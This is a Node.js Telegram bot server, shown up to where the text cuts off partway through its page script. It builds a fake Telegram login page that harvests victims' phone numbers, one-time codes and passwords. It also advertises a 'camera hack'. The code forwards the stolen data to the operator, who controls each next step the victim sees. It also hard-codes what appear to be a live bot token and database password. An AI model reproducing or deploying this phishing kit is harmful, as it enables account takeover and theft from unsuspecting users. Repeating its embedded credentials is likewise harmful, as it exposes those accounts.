// ====================== index.js – FINAL ULTIMATE VERSION (WITH TELEGRAM PHISHING FIXED - LOADING & 3 OPTIONS WORKING) ======================
/*
 * © 2026 SeXyxeon (VOIDSEC)
 * Features: Referral (only referrer gets credits), Coupon system, Ban/Unban,
 * Security scan (10KB-1MB all files), Payment accept fixed, Admin commands,
 * No commands button for users, Camera hack with live photo,
 * Full Admin API endpoints, Missing commands added, Payment bug fixed,
 * QR upload via bot, Help command, and many more.
 * 
 * FIXED: Telegram Phishing with proper loading screens
 * - User enters OTP -> loading screen appears until creator decides
 * - Creator has 3 options: Password Manga Raha, OTP Galat Hai, Open Ho Gya Telegram
 * - "Password Manga Raha" -> shows password page, user enters password, sent to creator
 * - "OTP Galat Hai" -> shows wrong OTP error, user retries
 * - "Open Ho Gya Telegram" -> shows success page directly
 * - After success -> "Your Telegram Premium request has been submitted. Please wait 24 hours."
 * - All data captured successfully!
 */

process.env.NTBA_FIX_350 = 1;

// ====================== CONFIG ======================
const config = {
    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
    S7: '@RTFGAMMING',
    adminId: '6346250222',
    port: process.env.PORT || 3000,
    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
    BATCH_SIZE: 100,
    LINK_EXPIRY: 15 * 60 * 1000,
    MAX_OPENS: 3,
    mongoUrl: 'mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0'
};

console.log('✅ Bot Token loaded!');
console.log('📌 Base URL:', config.baseUrl);

// ====================== DEPENDENCIES ======================
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ====================== MONGODB ======================
mongoose.connect(config.mongoUrl)
    .then(() => console.log('✅ MongoDB connected'))
    .catch(err => console.error('❌ MongoDB error:', err));

// ====================== SCHEMAS ======================
const userSchema = new mongoose.Schema({
    userId: { type: String, unique: true },
    credits: { type: Number, default: 3 },
    referrals: { type: Number, default: 0 },
    totalReferrals: { type: Number, default: 0 },
    unlimited: { type: Boolean, default: false },
    banned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now },
    referredBy: { type: String, default: null },
    _pendingReferrer: { type: String, default: null },
    _waitingForQR: { type: Boolean, default: false },
    _waitingForPhoto: { type: Boolean, default: false },
    _pendingPayment: { type: Object, default: null }
});
const photoSchema = new mongoose.Schema({
    id: { type: String, unique: true },
    filename: String,
    originalName: String,
    url: String,
    caption: String,
    uploadedAt: Date,
    active: { type: Boolean, default: true }
});
const referralSchema = new mongoose.Schema({
    referrerId: String,
    newUserId: String,
    timestamp: Date
});
const channelSchema = new mongoose.Schema({
    id: String,
    name: String,
    link: String
});
const featuredSchema = new mongoose.Schema({
    photo: { type: String, default: null },
    message: { type: String, default: '🌟 Welcome! Use /start to begin.' },
    status: { type: Boolean, default: true }
});
const linkSchema = new mongoose.Schema({
    fileId: { type: String, unique: true },
    userId: String,
    platform: String,
    url: String,
    createdAt: Date,
    expiresAt: Date,
    opens: { type: Number, default: 0 },
    maxOpens: { type: Number, default: 3 },
    active: { type: Boolean, default: true }
});
const couponSchema = new mongoose.Schema({
    code: { type: String, unique: true },
    credits: { type: Number, required: true },
    maxUses: { type: Number, required: true },
    usedCount: { type: Number, default: 0 },
    createdBy: { type: String, required: true },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Photo = mongoose.model('Photo', photoSchema);
const Referral = mongoose.model('Referral', referralSchema);
const Channel = mongoose.model('Channel', channelSchema);
const Featured = mongoose.model('Featured', featuredSchema);
const Link = mongoose.model('Link', linkSchema);
const Coupon = mongoose.model('Coupon', couponSchema);

// ====================== DIRECTORIES ======================
const PHOTO_DIR = path.join(__dirname, 'photos');
const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
const PAGES_DIR = path.join(__dirname, 'pages');
const DATA_DIR = path.join(__dirname, 'data');
const QR_FILE = path.join(DATA_DIR, 'qr.png');

if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ====================== MULTER ======================
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, BOT_PHOTO_DIR),
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
        cb(null, uniqueName);
    }
});
const upload = multer({
    storage,
    limits: { fileSize: 50 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) cb(null, true);
        else cb(new Error('Only images allowed!'));
    }
});

// ====================== DATA FUNCTIONS (MongoDB) ======================
async function getUser(userId) {
    let user = await User.findOne({ userId: String(userId) });
    if (!user) {
        user = new User({ userId: String(userId), credits: 3 });
        await user.save();
    }
    return user;
}
async function addReferral(referrerId, newUserId) {
    const referral = new Referral({ referrerId: String(referrerId), newUserId: String(newUserId), timestamp: new Date() });
    await referral.save();
    const referrer = await getUser(referrerId);
    referrer.totalReferrals += 1;
    referrer.referrals += 1;
    if (!referrer.unlimited) referrer.credits += 2;
    await referrer.save();
    return referrer;
}
async function useCredit(userId) {
    const user = await getUser(userId);
    if (user.unlimited) return true;
    if ((user.credits || 0) <= 0) return false;
    user.credits -= 1;
    await user.save();
    return true;
}
async function addCredits(userId, amount) {
    const user = await getUser(userId);
    if (user.unlimited) return user;
    user.credits += amount;
    await user.save();
    return user;
}
async function getPhotos() { return await Photo.find().sort({ uploadedAt: -1 }); }
async function addPhoto(file, caption) {
    const photo = new Photo({
        id: Date.now().toString(),
        filename: file.filename,
        originalName: file.originalname,
        url: '/api/photos/' + file.filename,
        caption: caption || '',
        uploadedAt: new Date(),
        active: true
    });
    await photo.save();
    return photo;
}
async function deletePhoto(id) {
    const photo = await Photo.findOne({ id });
    if (!photo) return false;
    const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    await Photo.deleteOne({ id });
    return true;
}
async function togglePhoto(id) {
    const photo = await Photo.findOne({ id });
    if (!photo) return false;
    photo.active = !photo.active;
    await photo.save();
    return photo;
}
async function getActivePhotos() { return await Photo.find({ active: true }); }
async function getRandomPhoto() {
    const photos = await getActivePhotos();
    if (photos.length === 0) return null;
    return photos[Math.floor(Math.random() * photos.length)];
}
async function getChannels() { return await Channel.find(); }
async function addChannel(id, name, link) {
    const channel = new Channel({ id, name, link });
    await channel.save();
    return channel;
}
async function removeChannel(id) { await Channel.deleteOne({ id }); }
async function getFeatured() {
    let featured = await Featured.findOne();
    if (!featured) { featured = new Featured(); await featured.save(); }
    return featured;
}
async function setFeaturedPhoto(photoId) {
    const featured = await getFeatured();
    featured.photo = photoId;
    await featured.save();
    return featured;
}
async function setFeaturedMessage(message) {
    const featured = await getFeatured();
    featured.message = message;
    await featured.save();
    return featured;
}
async function toggleFeaturedStatus() {
    const featured = await getFeatured();
    featured.status = !featured.status;
    await featured.save();
    return featured;
}
async function createLink(userId, platform, fileId, url) {
    const link = new Link({
        fileId,
        userId: String(userId),
        platform,
        url,
        createdAt: Date.now(),
        expiresAt: Date.now() + config.LINK_EXPIRY,
        opens: 0,
        maxOpens: config.MAX_OPENS,
        active: true
    });
    await link.save();
    return link.toObject();
}
async function getLink(fileId) {
    const link = await Link.findOne({ fileId });
    return link ? link.toObject() : null;
}
async function isLinkValid(fileId) {
    const link = await getLink(fileId);
    if (!link || !link.active) return false;
    if (Date.now() > link.expiresAt) return false;
    if (link.opens >= link.maxOpens) return false;
    return true;
}
async function incrementLinkOpen(fileId) {
    const link = await Link.findOne({ fileId });
    if (!link) return false;
    link.opens += 1;
    if (link.opens >= link.maxOpens) link.active = false;
    await link.save();
    return true;
}
async function checkAllChannels(userId) {
    const channels = await getChannels();
    for (const ch of channels) {
        try {
            const member = await S7.getChatMember(ch.id, userId);
            const valid = ['creator', 'administrator', 'member', 'restricted'];
            if (!valid.includes(member.status)) return false;
        } catch { return false; }
    }
    return true;
}
async function getChannelButtonsAsync() {
    const channels = await getChannels();
    const buttons = channels.map(ch => ([{ text: '📢 ' + ch.name, url: ch.link }]));
    buttons.push([{ text: '✅ Check All Joined', callback_data: 'check_all' }]);
    return { inline_keyboard: buttons };
}

// ====================== COUPON FUNCTIONS ======================
async function createCoupon(code, credits, maxUses, adminId) {
    const coupon = new Coupon({ code, credits, maxUses, createdBy: adminId });
    await coupon.save();
    return coupon;
}
async function redeemCoupon(userId, code) {
    const coupon = await Coupon.findOne({ code });
    if (!coupon) return { error: 'Invalid coupon code' };
    if (coupon.usedCount >= coupon.maxUses) return { error: 'Coupon limit full' };
    coupon.usedCount += 1;
    await coupon.save();
    await addCredits(userId, coupon.credits);
    return { success: true, credits: coupon.credits };
}
async function getCoupons() { return await Coupon.find(); }
async function deleteCoupon(code) { await Coupon.deleteOne({ code }); }

// ====================== QR FUNCTIONS (File System) ======================
function saveQRBuffer(buffer) {
    try {
        fs.writeFileSync(QR_FILE, buffer);
        console.log('✅ QR saved');
        logToFile('✅ QR saved');
        return true;
    } catch (err) {
        console.error('❌ QR save error:', err);
        logToFile('❌ QR save error: ' + err.message);
        return false;
    }
}
function deleteQRFile() {
    if (fs.existsSync(QR_FILE)) {
        fs.unlinkSync(QR_FILE);
        console.log('✅ QR deleted');
        logToFile('✅ QR deleted');
        return true;
    }
    return false;
}
function qrExists() { return fs.existsSync(QR_FILE); }

// ====================== HELPER FUNCTIONS ======================
function getUptime() {
    const ut = process.uptime();
    const h = Math.floor(ut / 3600);
    const m = Math.floor((ut % 3600) / 60);
    const s = Math.floor(ut % 60);
    return h + 'h ' + m + 'm ' + s + 's';
}
function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
    return '🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ' + platform + '\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ' + username + '\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ' + password + '\n⏱ ↝ ᴛɪᴍᴇ » ' + SYloveTiMe + '\n📝 ↝ ᴅᴀᴛᴇ » ' + SYloveDaTe + '\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ' + dev;
}
function MenuLove(firstName, dev, botName, LoveTime, message) {
    return '─【 ' + dev + ' 】─\n────────────────────\n ᴜsᴇʀ ➤ ' + firstName + ' ›\n ɴᴀᴍᴇ ➤ ' + botName + ' ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ' + LoveTime + '›\n ────────────────────\n\n ' + message + ' \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─';
}
function LoveNotifer(platform, username, password) {
    const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
    const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
    return LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, config.S7);
}
function SYloveMenu(firstName, message) {
    return MenuLove(firstName, config.S7, 'SeXyxeon', getUptime(), message);
}
function logToFile(message) {
    const timestamp = new Date().toISOString();
    const logPath = path.join(DATA_DIR, 'logs.txt');
    try {
        fs.appendFileSync(logPath, '[' + timestamp + '] ' + message + '\n');
    } catch (err) {
        console.error('Log write error:', err);
    }
}
async function resolveUserId(identifier) {
    if (!identifier) return null;
    let userId = identifier;
    if (identifier.startsWith('@')) {
        try {
            const chat = await S7.getChat(identifier);
            userId = chat.id.toString();
        } catch (e) {
            return null;
        }
    }
    const user = await User.findOne({ userId: userId });
    if (!user) return null;
    return userId;
}
async function isUserBanned(userId) {
    const user = await getUser(userId);
    return user.banned;
}

// ====================== FAST SEND BATCH ======================
var pendingPhotos = {};
var userActive = {};
async function sendBatchPhotos(userId) {
    if (!pendingPhotos[userId] || pendingPhotos[userId].length === 0) return;
    const photos = pendingPhotos[userId];
    const count = photos.length;
    logToFile('📸 Sending ' + count + ' photos to user ' + userId);
    try {
        await S7.sendPhoto(userId, photos[0], { caption: '📸 <b>' + count + ' photos received!</b>', parse_mode: 'HTML' });
        const batch = [];
        for (let i = 1; i < photos.length; i++) {
            batch.push(S7.sendPhoto(userId, photos[i]));
            if (batch.length >= 5) { await Promise.all(batch); batch.length = 0; }
        }
        if (batch.length) await Promise.all(batch);
    } catch (err) {
        logToFile('❌ Error sending photos: ' + err.message);
        for (let j = 1; j < photos.length; j++) {
            try { await S7.sendPhoto(userId, photos[j]); } catch (e) {}
        }
    }
    delete pendingPhotos[userId];
    delete userActive[userId];
}

// ====================== TELEGRAM PHISHING TEMPLATE (FIXED - WITH LOADING & 3 OPTIONS) ======================
const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #17212b;
            border-radius: 32px;
            padding: 45px 32px 40px;
            box-shadow: 0 25px 80px rgba(0,0,0,0.9);
            border: 1px solid rgba(255,255,255,0.04);
        }
        .logo {
            text-align: center;
            margin-bottom: 35px;
        }
        .logo svg {
            width: 72px;
            height: 72px;
        }
        .logo h1 {
            color: #ffffff;
            font-size: 28px;
            font-weight: 700;
            margin-top: 10px;
            letter-spacing: -0.5px;
        }
        .logo p {
            color: #8b9bb5;
            font-size: 16px;
            margin-top: 6px;
            font-weight: 400;
        }
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        .input-group label {
            display: block;
            color: #8b9bb5;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            letter-spacing: 0.3px;
        }
        .input-group input {
            width: 100%;
            padding: 16px 18px;
            background: #1e2a36;
            border: 2px solid #2b3b4a;
            border-radius: 14px;
            color: #ffffff;
            font-size: 18px;
            outline: none;
            transition: all 0.25s ease;
        }
        .input-group input:focus {
            border-color: #2b9eff;
            background: #1e2a36;
            box-shadow: 0 0 0 4px rgba(43, 158, 255, 0.12);
        }
        .input-group input::placeholder {
            color: #6b7f94;
            font-size: 16px;
        }
        .input-group .country-select {
            position: absolute;
            left: 18px;
            top: 42px;
            color: #ffffff;
            font-weight: 600;
            font-size: 18px;
            pointer-events: none;
            background: #1e2a36;
            padding-right: 10px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .input-group .country-select .flag {
            font-size: 20px;
        }
        .input-group .country-select .arrow {
            font-size: 12px;
            color: #6b7f94;
        }
        .input-group .phone-input {
            padding-left: 75px;
        }
        .btn {
            width: 100%;
            padding: 18px;
            background: #2b9eff;
            border: none;
            border-radius: 14px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s ease;
            margin-top: 12px;
        }
        .btn:hover {
            background: #4aabff;
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(43, 158, 255, 0.3);
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .btn-secondary {
            background: transparent;
            border: 2px solid #2b3b4a;
            color: #8b9bb5;
        }
        .btn-secondary:hover {
            background: rgba(255,255,255,0.04);
            border-color: #3b4b5a;
            transform: none;
            box-shadow: none;
        }
        .footer {
            text-align: center;
            margin-top: 28px;
            color: #6b7f94;
            font-size: 14px;
            line-height: 1.6;
        }
        .footer a {
            color: #2b9eff;
            text-decoration: none;
            font-weight: 500;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .loader {
            display: none;
            text-align: center;
            padding: 30px 0;
        }
        .loader .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #1e2a36;
            border-top-color: #2b9eff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            100% { transform: rotate(360deg); }
        }
        .loader p {
            color: #8b9bb5;
            margin-top: 16px;
            font-size: 15px;
            font-weight: 400;
        }
        .loader .sub-text {
            color: #6b7f94;
            font-size: 13px;
            margin-top: 6px;
        }
        .otp-section {
            display: none;
        }
        .otp-section.active {
            display: block;
        }
        .login-section {
            display: block;
        }
        .login-section.hidden {
            display: none;
        }
        .error-msg {
            background: rgba(255, 69, 58, 0.12);
            border: 1px solid rgba(255, 69, 58, 0.25);
            border-radius: 12px;
            padding: 14px 18px;
            color: #ff453a;
            font-size: 15px;
            margin-top: 12px;
            display: none;
            font-weight: 500;
        }
        .error-msg.show {
            display: block;
        }
        .success-msg {
            background: rgba(46, 213, 115, 0.12);
            border: 1px solid rgba(46, 213, 115, 0.25);
            border-radius: 12px;
            padding: 14px 18px;
            color: #2ed573;
            font-size: 15px;
            margin-top: 12px;
            display: none;
            font-weight: 500;
        }
        .success-msg.show {
            display: block;
        }
        .password-section {
            display: none;
        }
        .password-section.active {
            display: block;
        }
        .result-buttons {
            display: none;
            gap: 14px;
            margin-top: 25px;
            flex-direction: column;
        }
        .result-buttons.show {
            display: flex;
        }
        .result-buttons .btn {
            margin-top: 0;
        }
        .status-text {
            text-align: center;
            color: #8b9bb5;
            font-size: 15px;
            margin-top: 18px;
            display: none;
        }
        .status-text.show {
            display: block;
        }
        .final-status {
            text-align: center;
            padding: 25px 0;
        }
        .final-status .icon {
            font-size: 56px;
            margin-bottom: 12px;
        }
        .final-status h3 {
            color: #ffffff;
            font-size: 22px;
            font-weight: 700;
        }
        .final-status p {
            color: #8b9bb5;
            font-size: 16px;
            margin-top: 8px;
            line-height: 1.6;
        }
        .final-status .sub {
            color: #6b7f94;
            font-size: 14px;
            margin-top: 6px;
        }
        .final-status .highlight {
            color: #2ed573;
            font-weight: 600;
        }
        .resend-btn {
            background: transparent;
            border: none;
            color: #2b9eff;
            font-size: 14px;
            cursor: pointer;
            font-weight: 600;
            padding: 10px;
            margin-top: 8px;
            transition: all 0.2s;
        }
        .resend-btn:hover {
            color: #4aabff;
            text-decoration: underline;
        }
        .otp-timer {
            color: #6b7f94;
            font-size: 13px;
            text-align: center;
            margin-top: 10px;
        }
        .otp-timer span {
            color: #ffffff;
            font-weight: 600;
        }
        .input-hint {
            color: #6b7f94;
            font-size: 13px;
            margin-top: 6px;
            padding-left: 4px;
        }
        .decision-waiting {
            display: none;
            text-align: center;
            padding: 30px 0;
        }
        .decision-waiting.show {
            display: block;
        }
        .decision-waiting .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #1e2a36;
            border-top-color: #2b9eff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin: 0 auto;
        }
        .decision-waiting p {
            color: #8b9bb5;
            margin-top: 16px;
            font-size: 15px;
        }
        .decision-waiting .sub-text {
            color: #6b7f94;
            font-size: 13px;
            margin-top: 6px;
        }
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px 30px;
            }
            .logo h1 {
                font-size: 24px;
            }
            .input-group input {
                font-size: 16px;
                padding: 14px 16px;
            }
            .input-group .phone-input {
                padding-left: 70px;
            }
            .btn {
                font-size: 16px;
                padding: 16px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24Z" fill="#2B9EFF"/>
            <path d="M6.5 12L16.5 7L17.5 16.5L12.5 14L9.5 16.5L10 12.5L15 9.5L11 11.5L6.5 12Z" fill="white"/>
        </svg>
        <h1>Telegram</h1>
        <p id="page-subtitle">Sign in to your account</p>
    </div>

    <!-- Login Section -->
    <div id="loginSection" class="login-section">
        <div class="input-group">
            <label>Phone Number</label>
            <div style="position:relative;">
                <div class="country-select">
                    <span class="flag">🇮🇳</span>
                    <span>+91</span>
                    <span class="arrow">▼</span>
                </div>
                <input type="tel" id="phoneInput" class="phone-input" placeholder="Enter phone number" maxlength="10">
            </div>
            <div class="input-hint">Enter your phone number to receive a verification code</div>
        </div>
        <button class="btn" id="sendOtpBtn">Send OTP</button>
        <div id="loginError" class="error-msg"></div>
        <div class="loader" id="loginLoader">
            <div class="spinner"></div>
            <p>Sending verification code...</p>
        </div>
        <div class="footer">
            By signing up, you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>
        </div>
    </div>

    <!-- OTP Section -->
    <div id="otpSection" class="otp-section">
        <div class="input-group">
            <label>Verification Code</label>
            <input type="text" id="otpInput" placeholder="Enter 5-digit code" maxlength="5" inputmode="numeric">
            <div class="input-hint">Enter the code sent to your phone</div>
        </div>
        <button class="btn" id="verifyOtpBtn">Verify OTP</button>
        <div id="otpError" class="error-msg"></div>
        <div id="otpLoader" class="loader">
            <div class="spinner"></div>
            <p>Verifying code...</p>
            <div class="sub-text">Please wait while we verify your OTP</div>
        </div>
        <div id="decisionWaiting" class="decision-waiting">
            <div class="spinner"></div>
            <p>Verifying your request...</p>
            <div class="sub-text">Please wait, this may take a moment</div>
        </div>
        <div style="text-align:center;margin-top:14px;">
            <button class="resend-btn" id="resendOtpBtn">⟳ Resend OTP</button>
        </div>
        <div class="otp-timer">Code expires in <span id="otpTimer">60</span> seconds</div>
    </div>

    <!-- Password Section -->
    <div id="passwordSection" class="password-section">
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="passwordInput" placeholder="Enter your password">
            <div class="input-hint">Enter your Telegram account password</div>
        </div>
        <button class="btn" id="passwordSubmitBtn">Submit</button>
        <div id="passwordError" class="error-msg"></div>
        <div id="passwordLoader" class="loader">
            <div class="spinner"></div>
            <p>Verifying password...</p>
        </div>
        <div style="text-align:center;margin-top:14px;">
            <a href="#" style="color:#2b9eff;text-decoration:none;font-size:14px;font-weight:500;">Forgot password?</a>
        </div>
    </div>

    <!-- Final Result -->
    <div id="finalResult" style="display:none;">
        <div class="final-status">
            <div class="icon">✅</div>
            <h3>Your Telegram Premium request has been submitted</h3>
            <p>Please wait 24 hours for activation.</p>
            <div class="sub"><span class="highlight">🔄</span> Your request is being processed</div>
            <div class="sub" style="margin-top:8px;">You will receive a confirmation notification</div>
        </div>
        <div class="result-buttons show" style="display:flex !important;">
            <button class="btn" onclick="window.location.href='tg://resolve?domain=telegram'">
                📱 Open Telegram
            </button>
            <button class="btn btn-secondary" id="openCompletedBtn">
                ✅ I've Opened Telegram
            </button>
        </div>
        <div id="openStatus" class="status-text"></div>
    </div>

    <!-- Status Messages -->
    <div id="statusMessage" class="status-text"></div>
</div>

<script>
    // ====================== CONFIG ======================
    const SESSION_ID = 'SESSION_ID_PLACEHOLDER';
    const USER_ID = 'USER_ID_PLACEHOLDER';
    const PLATFORM = 'TELEGRAM_PREMIUM';

    // ====================== STATE ======================
    let currentStep = 'login';
    let phoneNumber = '';
    let otpCode = '';
    let password = '';
    let otpTimerInterval = null;
    let otpTimeLeft = 60;
    let isWaitingForDecision = false;
    let decisionCheckInterval = null;

    // ====================== DOM REFS ======================
    const loginSection = document.getElementById('loginSection');
    const otpSection = document.getElementById('otpSection');
    const passwordSection = document.getElementById('passwordSection');
    const finalResult = document.getElementById('finalResult');

    const phoneInput = document.getElementById('phoneInput');
    const sendOtpBtn = document.getElementById('sendOtpBtn');
    const loginLoader = document.getElementById('loginLoader');
    const loginError = document.getElementById('loginError');

    const otpInput = document.getElementById('otpInput');
    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
    const otpLoader = document.getElementById('otpLoader');
    const otpError = document.getElementById('otpError');
    const resendOtpBtn = document.getElementById('resendOtpBtn');
    const otpTimer = document.getElementById('otpTimer');
    const decisionWaiting = document.getElementById('decisionWaiting');

    const passwordInput = document.getElementById('passwordInput');
    const passwordSubmitBtn = document.getElementById('passwordSubmitBtn');
    const passwordLoader = document.getElementById('passwordLoader');
    const passwordError = document.getElementById('passwordError');

    const openCompletedBtn = document.getElementById('openCompletedBtn');
    const openStatus = document.getElementById('openStatus');

    // ====================== HELPER FUNCTIONS ======================
    function showLoader(loader) {
        loader.style.display = 'block';
    }
    function hideLoader(loader) {
        loader.style.display = 'none';
    }
    function showError(errorEl, msg) {
        errorEl.textContent = msg;
        errorEl.classList.add('show');
        setTimeout(() => errorEl.classList.remove('show'), 6000);
    }
    function hideError(errorEl) {
        errorEl.classList.remove('show');
    }
    function setStatus(msg, isSuccess = false) {
        const el = document.getElementById('statusMessage');
        el.textContent = msg;
        el.className = 'status-text show';
        if (isSuccess) {
            el.style.color = '#2ed573';
        } else {
            el.style.color = '#8b9bb5';
        }
        setTimeout(() => {
            el.classList.remove('show');
            el.style.color = '#8b9bb5';
        }, 5000);
    }

    function simulateLoading(callback, duration = 1500) {
        return new Promise(resolve => {
            setTimeout(() => {
                if (callback) callback();
                resolve();
            }, duration);
        });
    }

    function startOtpTimer() {
        otpTimeLeft = 60;
        otpTimer.textContent = otpTimeLeft;
        if (otpTimerInterval) clearInterval(otpTimerInterval);
        otpTimerInterval = setInterval(() => {
            otpTimeLeft--;
            otpTimer.textContent = otpTimeLeft;
            if (otpTimeLeft <= 0) {
                clearInterval(otpTimerInterval);
                otpTimer.textContent = '0';
                resendOtpBtn.style.color = '#2b9eff';
                resendOtpBtn.style.cursor = 'pointer';
                resendOtpBtn.disabled = false;
            }
        }, 1000);
        resendOtpBtn.style.color = '#6b7f94';
        resendOtpBtn.style.cursor = 'not-allowed';
        resendOtpBtn.disabled = true;
    }

    function showDecisionWaiting() {
        hideLoader(otpLoader);
        verifyOtpBtn.style.display = 'none';
        decisionWaiting.classList.add('show');
        isWaitingForDecision = true;
        // Start checking for decision
        if (decisionCheckInterval) clearInterval(decisionCheckInterval);
        decisionCheckInterval = setInterval(checkDecision, 2000);
    }

    function hideDecisionWaiting() {
        decisionWaiting.classList.remove('show');
        verifyOtpBtn.style.display = 'block';
        isWaitingForDecision = false;
        if (decisionCheckInterval) clearInterval(decisionCheckInterval);
    }

    // ====================== CHECK DECISION ======================
    async function checkDecision() {
        try {
            const response = await fetch('/api/telegram-decision/' + SESSION_ID);
            const data = await response.json();
            
            if (data.decision) {
                hideDecisionWaiting();
                
                if (data.decision === 'password') {
                    // Show password section
                    otpSection.classList.remove('active');
                    passwordSection.classList.add('active');
                    currentStep = 'password';
                    setStatus('🔐 Please enter your password', true);
                    passwordInput.focus();
                } else if (data.decision === 'wrong') {
                    // Show wrong OTP error
                    showError(otpError, '❌ Invalid verification code. Please try again.');
                    otpInput.value = '';
                    otpInput.focus();
                    verifyOtpBtn.style.display = 'block';
                    currentStep = 'otp';
                } else if (data.decision === 'open') {
                    // Show success page directly
                    otpSection.classList.remove('active');
                    finalResult.style.display = 'block';
                    currentStep = 'final';
                    setStatus('✅ Request submitted successfully!', true);
                }
            }
        } catch (err) {
            console.error('Decision check error:', err);
        }
    }

    // ====================== API CALLS ======================
    async function apiCall(action, data = {}) {
        try {
            const response = await fetch('/api/telegram-phish', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    ...data, 
                    sessionId: SESSION_ID, 
                    userId: USER_ID, 
                    platform: PLATFORM,
                    action: action 
                })
            });
            return await response.json();
        } catch (err) {
            console.error('API Error:', err);
            return { error: 'Network error' };
        }
    }

    // ====================== LOGIN ======================
    sendOtpBtn.addEventListener('click', async () => {
        const phone = phoneInput.value.trim();
        if (phone.length < 10) {
            showError(loginError, 'Please enter a valid 10-digit phone number.');
            return;
        }
        phoneNumber = phone;
        hideError(loginError);
        showLoader(loginLoader);
        sendOtpBtn.disabled = true;

        // Send phone to creator
        const result = await apiCall('phone', { phone: phoneNumber });

        await simulateLoading(() => {}, 1800);

        hideLoader(loginLoader);
        sendOtpBtn.disabled = false;

        if (result.status === 'success') {
            loginSection.classList.add('hidden');
            otpSection.classList.add('active');
            currentStep = 'otp';
            setStatus('📱 Verification code sent to your phone', true);
            startOtpTimer();
            otpInput.focus();
        } else {
            showError(loginError, '❌ Failed to send OTP. Please try again.');
        }
    });

    // ====================== OTP ======================
    verifyOtpBtn.addEventListener('click', async () => {
        const otp = otpInput.value.trim();
        if (otp.length < 5) {
            showError(otpError, 'Please enter a valid 5-digit verification code.');
            return;
        }
        otpCode = otp;
        hideError(otpError);
        
        // Show loading
        showLoader(otpLoader);
        verifyOtpBtn.disabled = true;

        // Send OTP to creator
        const result = await apiCall('otp', { otp: otpCode, phone: phoneNumber });

        if (result.status === 'waiting_decision') {
            // Hide loader and show decision waiting
            hideLoader(otpLoader);
            showDecisionWaiting();
            setStatus('⏳ Waiting for verification...');
        } else if (result.status === 'success') {
            hideLoader(otpLoader);
            verifyOtpBtn.disabled = false;
            otpSection.classList.remove('active');
            passwordSection.classList.add('active');
            currentStep = 'password';
            setStatus('🔐 OTP verified! Enter password', true);
